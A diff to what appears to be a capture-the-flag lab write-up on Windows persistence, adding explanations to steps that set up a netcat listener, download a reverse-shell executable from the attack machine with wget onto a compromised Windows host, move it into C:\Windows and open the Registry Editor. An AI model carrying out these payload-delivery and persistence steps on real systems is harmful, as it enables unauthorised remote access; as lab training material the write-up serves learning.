@@ -204,7 +204,7 @@ Payload size: 460 bytes
 Final size of exe file: 7168 bytes
 Saved as: revshell.exe
 ```
-3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine
+3. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener that'll listen for inbound connections
 ```Bash
 root@ip-10-10-157-221:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
@@ -220,11 +220,11 @@ C:\Users\Administrator>powershell
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 ```
-6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine
+6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine to download our payload from our attack machine and save it under a different name 
 ```PowerShell
 PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
 ```
-7. `dir` from the compromised Windows machine
+7. `dir` from the compromised Windows machine display the files and directories that are in our current working directory to verify if the payload has been successfully downloaded from our attack machine, which it has
 ```PowerShell
 PS C:\Users\Administrator> dir
 
@@ -248,13 +248,13 @@ d-r---        3/17/2021   3:13 PM                Searches
 d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/7/2023   5:31 PM           7168 revshell.exe
 ```
-8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>`
+8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>` from the compromised Windows machine to move the payload from the current working directory into the **C:\Windows** directory
 ```PowerShell
 ```PowerShell
 PS C:\Users\Administrator>move revshell.exe C:\Windows
         1 file(s) moved.
 ```
-9. `regedit`
+9. `regedit` from the compromised Windows machine to open the Registry Editor (**regedit**)
 ```PowerShell
 C:\Users\Administrator>regedit
 ```
@@ -320,11 +320,11 @@ C:\Users\Administrator>powershell
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
 ```
-6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine
+6. `wget http://<ATTACK MACHINE IP>:8000/<PAYLOAD NAME>.exe -O <PAYLOAD NAME>.exe` from the compromised Windows machine to download our payload from our attack machine and save it under a different name 
 ```PowerShell
 PS C:\Users\Administrator> wget http://10.10.157.221:8000/revshell.exe -O revshell.exe
 ```
-7. `dir` from the compromised Windows machine
+7. `dir` from the compromised Windows machine display the files and directories that are in our current working directory to verify if the payload has been successfully downloaded from our attack machine, which it has
 ```PowerShell
 PS C:\Users\Administrator> dir
 
@@ -348,7 +348,7 @@ d-r---        3/17/2021   3:13 PM                Searches
 d-r---        3/17/2021   3:13 PM                Videos
 -a----         7/7/2023   5:31 PM           7168 revshell.exe
 ```
-8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>`
+8. `move <PAYLOAD NAME>.exe <DESTINATION PATH>` from the compromised Windows machine to move the payload from the current working directory into the **C:\Windows** directory
 ```PowerShell
 ```PowerShell
 PS C:\Users\Administrator>move revshell.exe C:\Windows
